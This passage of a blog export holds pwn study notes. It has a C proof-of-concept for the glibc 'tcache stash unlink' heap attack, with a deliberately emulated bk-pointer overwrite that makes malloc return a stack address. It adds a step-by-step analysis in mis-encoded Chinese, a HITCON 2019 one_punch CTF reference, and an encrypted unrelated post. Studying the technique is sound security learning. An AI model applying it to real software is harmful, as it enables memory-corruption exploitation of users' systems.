<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc tcache_stash.c -g -o tcache_stash</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var: %p\n\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h3>
<p>Step1: å®šä¹‰<code>chunk_lis</code>å­˜æ”¾å †çš„æ•°ç»„ï¼Œ<code>stack_var</code>ä½œä¸º<code>fake chunk</code> ï¼Œ<code>target</code>ä¸€ä¸ªæŒ‡é’ˆ,å¹¶ä¿®è¯¥<code>fake chunk</code>çš„<code>bk</code>ä¸º<code>stack_var[2]</code>çš„åœ°å€</p>
<p>Step2: ç”³è¯·ä¹ä¸ªå—ï¼Œå¹¶ä¸”å°†1ï¼Œ3-8å·å—é‡Šæ”¾è¿›<code>tcache</code> , å°†tcacheå¡«æ»¡ï¼Œ0ï¼Œ2å·å—é‡Šæ”¾è¿›å…¥<code>unsorted bin</code></p>
<p>Step3: ç”³è¯·ä¸€ä¸ªå¤§äº0,2å·å—çš„å—ï¼Œå‘ç”Ÿ<code>unsorted bin</code>éå†ï¼Œ0ï¼Œ2å·å—ä¼šè¿›å…¥<code>small bin</code>ï¼Œä»<code>tcache</code>ä¸­ç”³è¯·ä¸¤ä¸ªå—å‡ºæ¥ï¼Œæ­¤æ—¶å­˜åœ¨5<code>tcache</code>,2<code>smallbin</code></p>
<p>Step4: å°†2å·å—çš„<code>bk</code>æ”¹ä¸º<code>fake chunk</code>çš„åœ°å€</p>
<p>Step5: <code>calloc</code>ç”³è¯·ä¸€ä¸ªå—ï¼Œç”±äº<code>calloc</code>åœ¨ç”³è¯·çš„æ—¶å€™ä¸ä¼šä»<code>tcache</code>ä¸­è·å–ï¼Œæ‰€ä»¥ä¼šå°†<code>smallbin</code>ä¸­çš„0å·å—ç”³è¯·å‡ºæ¥ï¼Œæ¥ä¸‹æ¥è§¦å‘<code>tcache stash</code>,ä¼šå°†2å·å—ä»¥åŠæˆ‘ä»¬çš„<code>fake chunk</code>æŒ‚è¿›<code>tcache</code>ä¸­ï¼Œç”±äºå®ƒåªå¯¹2å·å—åšæ£€æŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„<code>fake chunk</code>å¯ä»¥é¡ºåˆ©çš„æŒ‚è¿›<code>tcache</code>ä¸­</p>
<p>Step6: å†æ¬¡ç”³è¯·ï¼Œå°±èƒ½ç”³è¯·åˆ°æˆ‘ä»¬çš„<code>fake chunk</code>,åŒæ—¶<code>fake chunk -&gt; bk + 0x10</code>ä¹Ÿè¢«å†™å…¥äº†ä¸€ä¸ªlibcä¸­çš„åœ°å€</p>
<h2 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h2>
<h3 id="HITCON-2019-one-punch"><a class="header-anchor" href="#HITCON-2019-one-punch">Â¶</a>[HITCON 2019]one_punch</h3>
<p><a href="https://gitee.com/Nss-harukii/images/raw/master/one_punch">é™„ä»¶</a></p>
<p>é¢˜ç›®ç¯å¢ƒæ˜¯glibc2.29, glibc2.27ä¸glibc2.29åœ¨<code>tcache stash unlink</code>çš„ä»£ç æ˜¯ä¸€æ ·çš„</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>glibcå †</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ†å¸ƒå¼å¹¶è¡Œè®¡ç®—(spark)å¤ä¹ ï¼Œä¸å‡†è€ƒä¸è¿‡æ</title>
    <url>/2021/12/27/spark/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="724e61009728a7b3f33f7aacc4ae5cdb993a53a7bcc5586e323611bf90f1dace">1555d0d40729d3271e79c21f57f1baa7539bdb306b52cf8c920f4028c3bf0269c7c42540494f0aaf3d5d16ddf353e17ef397138cb2e08f3d8b5f4489c4d55d358787f22eb5f802d434279af00bec126809531cfbda9abea812ee753741fbc7edf81c31e13033aa2c157eb60504d4eab0594a4e7334c9eaf16898b72c9ae280f2bcdc171c38e0372d366aec59efbc6e2e45de2fd7b9a6be46adf3db25099845fc08a7060916abc3772801bca2af081cb25e242bcbd8f1836edb6fbe5e879e497db6899b5fb9c795b27fd09b2a8642d608e80cc55dfe2db90498c66d6cc3cdccb0d762bd37c37c0a3f5b8cda4a3d63e852bd12171186e2616f6ce12d7ea02e484ca06e754fc75f3149e6c02b5af96e321995670a327d31aacc86f645b82b52c440b0b47077f8759ed5cbdc2a823ebd6db88aaf3f41ba263db01fe0bc58916877f5abac23e26558a4cce51df2d7da4b7d3c58f492dde272e9a6c959e6553bcfd3a842d63e292b3f68eae2b5a15afe30c1dcf276a1fd577e14ba3d0754d55c39268ef46258f3a8c4227b675da48995b09f9d00e4fa4874e678ffe0610185a3a8e5e57d6766ca122a3d6702187c3a9c1e2c7a073ab15f2c2a9ad68cc39cbf62d318c8d2e0b27e1a1bbd6835664414e9d6572a20cc124ba95fd76684ba0b3da5b1735fb9af3a229cb65215d41e9d999450ead4a681f9cb76942e0bd7ef9d14c0932a0b6226838103ffb48f6a98d1173a4b076e1b45d939b78a286d67047f149f6181289042b3e368bed3d173df02902396697760fb3e07d95c37a38bf8f0783b08dfef7818ccba2be5acb089f1fc0dd22bde388843e4fcf6c18930e834dd42bb8c26818164176183ca78c7ffa3afeafebd7082d070a2ca3f91b385203692f2ccf5e6478ee66cb83919f24463098d3758406b54c731e31945c7a009f968813327241f2f97b8510b3f605421f007bc883259bcce802856e03881ce5a2fb3a1ec23e836a198bde7d59f864eb9c3abf70b3c82ebc54910d689fe86e79a2b781aed95eab4c806696485024f30a92ced1e90aeb93400fe58533a530ebcc20f8e40726530b5df26bb174d1d89e823e92c90662ebd2826283f3ed9ce9afe26d02d6e474089179b9db265fe5c1a9371b547616ae06bf342af61d2f6432f59741cf9b2490b6102d9ef2ad5f36aad3955e9915aa879b686f34c49bfe526de45c7e333ef6ac3c8dc12edc3a26ec84df35403b86c06a069f1b5718f825b727e4ea74ea014164cb1b6663d67d1e2adc0dab9e7443b4ebc874f9e1fb9fbca4ca984f9e71d2f7dbcfaaa272c5ae905eb25b2e29a9744ccf3a5e67e7404ed971cdc9b343daa2d48b8e503e00403064607c23af9d99f0bdaaaa177b463bec36abd3d57b5ffe027b07126e3bb5b787e0977e4a896af32658df4fa082ff691444ec26a7df8fbfce571c38dc4ddd612e0d2ddfcd6497bf4d445dac3ea517301d1e628851cabf3a10550d4f949be9f23c888d5d7841033b5521ba21cde0178a396aa83d656b104c33f04149872e72d487aa695f751f3a9f5831a71d9152316b1ef9364f7e2c137fe78052dfaf545bce4082774b740ee6f37d00634cadb9c73fe7ff0324ced8f668c50ef9e56444af3523bb15fc89e005933210c50bce6b1bcedc4ea14ce356fca468284fa45e4506dae3a0f69aed9515541d7b9bb8872fb5f37136af058aca308c92f76284904dd4db25460532a8561786da78e53a5af353adeec72a3e91eac58019d52ca31a769d15b76f84131e70f51201655fbc95141d6731925778b1019e3e7995dde88c3380edaf22c980b5cc2e97ae84dee3f41a4fb7d8e3e0e581022da226799d396e2ba72604e33bd4d5ad05568cd700c9d512bd977e6c02a1dcda176c1bfb1948725beea8b57413a614b9a15a042b9fa5809f43ebdb8aa0517e7cf76d4221810902a9a6209af4104ea4c693899980aac799318f696894abfeef5744ab358d94269111eee7350e5e22920e96cc9a37a796c49f38a53a74bdb7d777649d163e66d8efebe6a4a0b0378a0fcd37a83371c92ad075752e5e297eff048e6a4e067dcb1db07d44da1b422e8cd0f9b09899ea355434257a6b6137cd38334eb4cb0933271538cd145a0c3703674d7d1a2d7e096c9461d73f71fc58d3487d9baecb44d0948466a8adbb55e1601e068db3ba1c88f65bdb4e66f079287f5a8845c8aa59fcb5bbddbde9b2644fe6d041ed017f9949eb23cea8f58b303a5c2cd8e5f2009733f34a8c9f7f34b5cba600bccb9a9d11c1372616d14d429a57697cff4235eb42845a70354b55c805d3992ac24b397a5b1e0efb77e66becef916b350486994e215ac41d398d4172ed626e67f79984371269dbcb16f3f433d8b0cebd79b38d1ebd2dab639981a3ff3f3d8fb6a8e7ed2f184092c6c18564b4d8f4bab3abaa5ec41f86e3eb2226e15ec558307be4a25901c7268125468c4cc9c040dd8d54302bdb434b32b0b29e378f915da629dc617e26f453b0d0d1a7ec321d250443e515dd2287e999a8a4564afaa78aa1e46d7a575e3a1666dfb8b154e4c874b352f3d499102e8b58393e6d7e749182e9492f0b6203a0fa84c9c4876dff31d3c9730d6f7b7178a63b2f93c1bf8d4fabc6059f62bacb117cbe038522995bc798a3777aae976dcfcd19156f482268e8003f4ce1b3dff898be3c9fec1d2f7d7222672ab63be8b5fe89738541540b3cd25351907727469a01fc476623eb904cf082f36162b2edcb5a6914a28566a481ed626f604bd842e3e5b0f8b8bb2e9c68090c0e15db2c956166369612e5fb95c27f57b9e0452cbcde570b9262561af75f5e38bcfcfa52d45da9c44f40bf19f5ab6b51febd1c45f0622fe1c5ed294be75f61f45aefa38c6d3482a9299497b82cc64a6fc1ee90888a31bef49c89682c924cffda9ab09032ea885077a6c9cf2a93232e029f4af719de1064b32bc05452ebe699bdfb0e9b1f943dce93347ceca6bee0b6cf2a9520651a85fe9059db92c0e8fce2bb893c47be660d595bddaf50cf982684ac2d9fa141ad6018fa4dfe2e5fc3b7847155fa4f55970342eb0609003613ac01adcc73c13a31b7592c9048faf931f9abaebcc4c749a2872b0577b6fa0a8bb86c5a4b8b98268fa1c2368140ae96d1e2c8ee6e4ead975ad4282d0aaeb94b87154d0476358e3c45044f58c6a9277f55f638841169e792487eb05393c15ff895e2c7b3eef7f7f35313cfda80596b8e8e5a9b90b91e4517cb4d5202922eb03bec589f4e6ae2b16c74b6faeb0ebc4cca7aad4497ca566ef3b74ca121249718ebaa012761e689d0be9f403af48f8f8d9ba41fff5799ab4a0443d76928abc87f0cd0785826072eb89cadb993dd45d3b5f15f3b09ea2344285db0803de32b0d32ba2bc6a79cb1a409a5df5c9d2643e9f3bbc3d96539a2e2d612e5d45a8c41476039d033be0a5c8d2153cfe52806fb89707e0fc61724e60636f42d0d4c395b1f3711f598d46d41edf18d04ccf207553b0869ec5ab234360f84122712a094d43d9cb6ba6fb7a585df95ad1ab0e89f18ad2ebcd226babbd643d095eb527e284a70ef4e32deedcc2d018f7bdf2ab37ae0c9c90a5282e9da91f92a565180fe7d9c4a38c3be42468da42f881b5658bd05a82f3c9ac1ac249fb4671dc9492f262bb625a639d4d155d1c7761e610c81e98178453e599e4cb5a73bdb665f75fb1b9999b87797e706b105728c970a03b01d692a8ce607574fccd3b9441a1f29ccb5b0e85396d8db20f151ed33377fce067e59f81769e18ae96b95df551af5f4e8770940e3c25bc3f5b9865dd6c06e09818ed104351d70420582d478790f8f513268ba5ba5dead3240f237340277798d3ba2383093d0683ec75e3c1fe09d6892918432c03e59dbf7ed8750814c66b9dea258bb52be0c32bc74a1c60bfd4db7a41f50f95cc38708f9b4b3682f00b2628eb1e18c79f5d7484416d29cc970e5d6c1153c9024065c7401c1a119c51270c1437b77a764fe7336eae9ef53b6ec37278415809b56aeddfc19d369a4200000a5d9882d5638b8658cd12d4211178818b27a29dfd185c23038217f55936619c5d669919e747feea9f05f3555e08a5ceff4dcd78c86a75d3f5ecee1dfb185d670ada82d47da191cd31ebeecb6ad2156ab6befb7368a00daecab72981876fe2d109cbcec62ef5ef75d784bbd3d55a0f71e40b217969ff82dd3405f471131d5e394330e88c74d5a9c62fea2b164d02ec63b819abdd7f0bcefd0c442019c1f583cd998a38dc80378140cdfbb3735418d09c842fd349feb5e126522315343422822cfba73276b28663be464a76957b7d290c45d54f2627748a28512a019ec1a1ba31862a4954ff737c65719e07d9f17fe105b15dcc5781119352e6e15dbd487470428cb7ec629f9242b5b1539dc1c4a3c79a495e1e0e1a734364a2c705d85bba3708bf05c5d57eace88dbd1b577afebe5f933781bf57f348e8beee57a72a0988c10c24e8fe73ba364de7266f0e425555e6ace3e550889ea0060bc90ff175a4136a193a73bd06d0f682e260dce1cf871b4c11c459569a61c10f35da821e55741105031897cd32a47bf40a9dd7a8e34254254c05d52d17adb43c4e1c78e341264b7fe8670d4626180bacc7f7dc86db13c409aebe5280608893a6b446de4f3df50ab28df7073a0ddfa14da6f0a2b96b250bfe46583e006bcf5d817d5cd5d99b955286cd4be1968028208bf7cc331adda18a6b17516ad6830d630fde63907e9ea6a6f48ec8eef9f7ee66b9c5a8daf2325583cb00cc8537469560e1cbbd3c57119e7aaabd88d6bc7045247d37aee084dab2a618a22f224ee7175552c50d47f7bd5b07d130a13692be590c49dbe7d565c7462c09d6c0d447c9bc0d899d3d1b0eff477091b648dce116c951ff01e4ad56ba7ae8591f77083ac1f1ec2a1cc38cccee9dce4a4e1a1ef78bf6797796938f6e28e7d6b4f347f5d7f398a7776705f1458dd44110248191085a2280f3e60b51f31d4af81969cdf6f078976451de06f2d6c8ad9bd75cf396097ddf2921575d538fd4afd3e545f07ca86057080287ba4b2f3cc67813493eb4acccc728b17fb5b09475e3f0f539c54916fb81119cf91a3b4df5724bb5840c22e400d67f2b8bffcd79a1ec344966e49d1bf827a7e8511506d02b58b67744ec6f67544e4478b99d219c3f86279b60aabc75c62b3174330e3049e898cc62768138eac562055d8d114af63f0f39bba83b047548ab2e48014fb72089506ecdbb4f28aa7464e182ae5eaf0445d5e73edb70899c491a4e6660ff9c913eea6f0962799c2cad1359a2fb16344a48837777917030f24ebcd091c857feab9289e8ef71da9c5e5de83413923aee7e02db247433dbafb2bc0ec7c491099230e8d5575b817394cd20ec8bdd11ee576db23ce929f1881149d022f0b37cd5d52fca20874890fefe7d1562808b21a34b3a45693f8ba56e6c9fb7fb5a83fd207743363e48ba868cbbcc07caa5691868074112530684a7c732d912348e4f3e739b062e2abc7d838306142c655d5e52a95451f969494c0da5dfd510cabda8fe65dde703493bfe5fbe1cde2247005bc8f8bbecfdc20ab43b2754536d2161dcdbe5e760596f8cc898605983ca6a53b972fe0baac88fc27af674b342be66f54cb2765c6dab20ded62441e9d1f45f5fdb017263fb2e68398762fcb0172ac9f71fb0c2aa2cc7fab751fad8bc3256effb4a22200e67cb31fd0e12a0831c3978f6e46d72a1cddf6c7888a19881478372db03332ee5237636ec3a3ef6a379de495ebc2f0b9de50fafd8d33bbe2d4b1a03d29d3c48fc40dbe7a08fa793d1d7ee5f927a3a5de5cffea0203e97bc6dd23b8b2048cc9db74ab2d3b95342ce79700d6f0cc27c8381b7f8a0bd49a307e8bfa69fc0f831b0a4d2ce2fe9c1f05d556d911a91fe68ad0aa6be1b2d7a0db881e03aa69c3f498822321ae0971719c9278e8eaeec232e2e950167006e9260ced51f1bc1f2b9293ac33888d287e57b5f21ea72c7f799390629582eb6f8ed83db0704885a68f9d90642e4f3f691ca414444f6848ec2436521c6a8ede45fb619e204f9e0f28538ec4767dedfc15805c93b8e67957d05cacc5aaadcd7ae7ec230eeac191f3f0ed3c1e9b7c71c4f93307164ba0ad1398bf596da631dc7c009fbcf990d576f20a40830acd6252d05f4fe8aa7a70282a17be9f4fd91743845a18c85902f0005370f883046c01b1423a7b5519afc823f8e0e1bb1cbaf1c485a7edac4647211fa0cff545716f4a4a17954763b4da653451b471008855625ec2458581768c86b127e40f16169792c442863e5c42b5dec8a9877b095d6c8a95b32444005bca79f4e9a7b0a614ab5b51f1b1d4a5e127060b452371bffe3f766a7767138f5e9263b05abd2452713b64bbe30ddc554abe676baadd71f3a0986bcf1268cf9353b8f8d2403726b7930a2f28c04a15e274fc6bccf5503cbd1352f1df146b34eeff605dc833758006b22bba103abc814bb8ba1719f6b74f9ba168caa1c55474d6cd12117eddc987e86aa22573158a3cf2441c551477f2d87475da44e6a4f4d87425e9a510d29d1380e51f4910d3978b14fdfc448e091a83b3567c0b3f8c15c1cb436aa04375e2b126694b02788af7b3a6ebc22178392cc353dd4965a79abd1851b33d73fc1a6a53b92ff4d64e6d962d540e4016cfdb21aa46978bae1fdb1f2f1efc0535b564a025c965b5b90a0b481c8479ae1917fd9f763fbe2686534fb70fb67c7200ca6395be5966deb2ad1e71f5ba55a04fe16e0df10655d4d68391a84405fd5f9c69ba3016c050ab86610098aaaede60400300ef41116c216cded2227e05a87b3755b7e5fb7ee2cf61efafdca4a95a88b5afdceafe2758acd0bb3bd8bc5f4db81f6b0cf95a13e70af4cce25f2e99beba0602fe39b5ad57af242f881dbf32ef70953aa4fee0fd4eaeb736d368e9457a26e83a41660765493318dcb05a390033285f7e8fd135440d96e179a45ce187d3d61f39142ad77b19826b9ef90d8a7ce32287f94025e7455fd394ceb93d652601c9fbea80f908256ab9d7a248a2e93f9dc8ae5deeb8c21a1901390782dfd7f667fbca915a083e40c9e92c076069c524058817c59ba83d2964b7d6fc9446096edf9f0ef4e68b41bac52f8267bbab593f06788abceb8fd396fe8101502cbf3ccecfec999b6a77af5a734785098176c66c6b6154ec8d224decf914bcf4e004f27a338c7a4183ab486d29902bf5a7b038113495164d0f597ead1df49305185b265a152f7fb36a85d86522b64fb7dfcbe6a678efd5b47f4d5838678bc39ef063219077aaee66fb1e7a489ba0e21f8d7074af1380424eddecbab4322e06bc8e6b0c960c703b0f7f95f59fac4aadc0012b451b45777a4f6f00b623a9ea7030fae3a9ae5c9deff5d577559439f428ea29964e59a4b716b8d80ed8f8fe7bc9f6eaed01d3cdfafdb7571b45c360b5b5d543df1147855b8f3afe8ae18d6fec1ae769e75a975439807b65c5a329b6c34e25d4ea0b19cb0dc19529db1215d2ba2941a6efbad7dff1e4aff3886f0b84a44a9b36eb1a30d7f6097cfe7c1ea9235442e1e8d5fd63147168f5161f7a42069fa7bf36c6e14dfd8d088a16e5fbcefc6e0dc6675769a44f950671513d291c30f631e93d06d48a7f6b021cf124fd8e6b4b60767b1fae72538fd772bec78429fafef0477cf1f40e568a181b3586411b5234444b144ea36ce0ec85c2468cfd8e8d8922c833ee093616b5103464b60c6b61350ec0115b796c001d5f494520f8d7c9bb91d54887f80145063cbd12dc06126e21e0325f7c9f649f6a84f94802016796c9cb80987f34ac784116f296ab4c3ad3391953e769b0c0b415c76cfef6dc9ba62bdfb98b4fc9c816c39406a8f57ccc3b2620ca08ddd5c5aebb70a57db085aa8f705a5b17f67deeb937a9853c25b1ac4e31e431c6c9925bb8a532b4e72993e83d949f31efd33ce82a5db767817dc508a1a4cfcbdd6945de5ec7413c6140502e2fb70a6993cbbdb2d5ccf8c3f6c7da6f91fdb42246be3e6fb40679056e170774a8cecc56ab97bff36edfbadd888b069d9b0b828adc1c024d1bf64ee73ccbab1740ac7523392c505c828b12552f02beb95591b24164ced1a33452e460699e7aca49760d4894db8819aa23a0d344954f65908eb020cf1896b1a96ab71a644838fac1efed11697d0b4b3c4e51fe09ee696c49a9071efe7798fb2dc1c036f91a53411b125fbfd6c51cd26e6ebc270741a214b08f9e597afc33f7145fd57db71101a97d774c3d951e9f4915637f85eee9ba98bd2c4214a66d6764e0a1ae629fa52f3eadad1f29ad8823db645b496db129429d88ae78ddd3237d9de5d91d13ad4a3173b5b98654b311cd1e05f52784be76c9f4f8ac9d9b1d9c27c4905b60b35b70cbb4ee0e7ffa6e820de8c4e0552069f7ec6757d5d44f993847fdfa2537441b8df930da22c6d40ba8aa2fd66a88be7cdf05621c5e5f15d2b4bdb711235e558385f9c491dc9b1e405082ad18e04f2fc7942eddade4b731b1dbf226eae1b2ef8bcc3899d1e03dda0a0ac2f5875d41f1d947dad4b6173f0770fd3659b5bb39dd081cb2e429edbe8df2d93c7e2dd2dd189f6408ec3f8f6ae1cfab044c1fe89f4839d6541d80c9fe48b82b5b41d4979efc76f74d23a81c7bf74c9e62d954d8a8d4cb8efcd0a97cfc601bef8c4cfc5ee6d09173fb16cdd2b532faf0aaed45bd9963a5f88a1aac2cb2ca765b08f32a0fe16851f54159f370050176b0e360450b37328da205f28542307e3722782a352721dae797b2f4368c45efa2d249e82761790ac2d58b65a18e755f0e1fa78d60cf970a3eca5df58907b1cc61f67be0f0f2251615205c5b4810a916402913fa0c1494d8023120ee517e3c3b2219584191b5103568d4948814e624303a354c06ad6da0f2d896b0ef27c08e1a9faa6c389931b5027f0390ed1db506e978a721f7f87e7c57bf830d00ea147ffacbdf42a58a938cdccc87189f64a7c9efa00c03dfc97738153c74ceca86d7d2afe7daa1ee134cbd7df6538f89d81613e2c3a9326e6923a1e07dc9e3a7ee68ed547615a03ad017fd433fdf56fe17c769f516f46acbe83db910b2d60850fe0dcadba471021bb131266132516a6b260dda8e6cacf535066ecb74461b0409cd46cf3a5f3dec746c9301c5291866a3d5eb5e2711bfd062b338694051c3e4f40dde88a0a15f3e05d1dc8ca7ee9a6225eae107f01538b1b5d32f39a6cd6f227b5ea0678fe550367f47547c0c080d6da164a584c0f09614f0a948605491a6406d1fcf9c01c0378a0f3d225d2f14a7c0ba5cebc414854c40f4cd086e05759ac7602c521c647d35393fcdd2ad61317f6979eb1814475aa37ee2d32aff1a908e62ff29d1b56a5544f69f26dc1a152fbe2af73e019bfeec212a591aecd5ab1c325c2fdfe9d539b9579059d4fdb9ae0acbc059b6ec1019a081aab318055c8046c303c1fab0bd0e1e68b4e62d3ebed2c59559372c33a5675f81111eeeb93444131aae066e39dbda09106dcb602a0f077a2fd59c0bbd159f2c545f59a33b3e9ae65ea4206cdfe463315303e6522c20783652cb32d46cd7dcb4d12cf02c5012375266684dc872bbd62490655d6c00ea1b6eb55e940e438ea091c8bf85c1d12f898b38c7f53cd12c9896f352df9a97e3d1ae04a6dc3f1e24d18132d07215186454bbc397b644132f145b719da1018acc36de972f9e970889947425ed2003b99259e5f1e04e92d421124457c86843a3a7c26633c6bfc30d3e8ebbab5760fedc212eb0fb204d3d6c2b1d406edf9dd8c6ef1773bfe889658242d3aaefe294ebe2b077f6b1f6950bd2cc3a8816d75ffce7fedbb58d1c15855830d83d10fcaedef95ff50691b1ca9d15408549886d78f90348449d31e66cc949304f997c2680d68d9a1ab857ba8137676a7445260a1f81af6f48c325fe0a122e6029b5b658ce6e4a6c0d10e803c021876749590171fe1247f3348f1c50931cfe93ce37cd811d89349013587b0a537af5efde2fa2fac607ab04ff3e3fce96e04292a54b06b14205cb5b84975c6a9f1a82265606a97f63369d22460d54b5319ae38fa620c25e50f3215f8e37d0c5ed39008a2a989a6dd72899f1d7c04f64b1aa0ec6512d7eae58c69a43a45124bca786533bdc36a6d49d5b6e28dde7410d9a68d6879dbb137d3e1b94148678f3a117b251cd281e4eb767c8b83cf1fe35f9b1bb0d6eb7df4354a70fabac8a606040e06b031018400dc2c8c095857455ff7727c14f6cacf15489794e74226af698bda216d510e9de391de3613ec136dc5a33c8e6e41d949eeb83e3ac9ec67b6ceb56a850b03102d669ecc9aa44e15c0730a0ff54576ef9d9c7b3369689ed9227f0c8f1af3754ece674bf302853dc573d2962bf69fb7527df315bb22da558438f97db81ecc28ebdca9a09854adf2aff57839c1e3f64aee3b92e5cfe25732e4a9e64f252854cda1c4f5dfb692fa90a0a3ba045998ca233e44125a04c9ee3598a1d0f6b970da6903dd6964543eb0dc1a30770e94a90d2b9d6ae5598a96f66927fbdb2737f6c85e0de4236e34830f593b1e3d6665d08bb906977fa8a8a9f15ce5188e5e1877d62e39c793077d8f4f1ec4b850353da9bb634fc6a42d6a78eeb8ce6b9af274410ab2b28782866a24fefb3b1e9917b63cf271e72c3500849fe4224885e5933b62b9631f4eed5cce99ebc8987b5b967240fc054dcb387cd140318faa6426c358a44878d50ef6e06c18e7d8c9ec78bb6ad2fd83afdd780d7a7d3d411dd2efc1c5766081324268daea2b613d0a4e26816677c6ff7e7f4a386635dd845bcdea80652fb7f9c93a722455afd8ded6c4844ff0129f6d9d1b9be4606abb8357b3da5af9daac7f2bfe1cef54238134dcbef8d8196e8b01a6b18fb8f55221fe6f162d76ba2748d5f697c5c1cfd3c6684cc3ebe6e370aa6439bf94dbea3509740f6b610b4ae8264b335b554690edc3ea4ee1fce4aa8e38c852972543a37ac7ad16b2a357aeb5ae915c70ca996e47b176c843997e910422bf8315900c2a41bbba84a6be144ac1bd63601e56b18a95f001c064ca618ff368c365f7ac77313f84933ea028164661bf65dd0d556bd114170ef41213d304eb15a20f3e129a7b98e47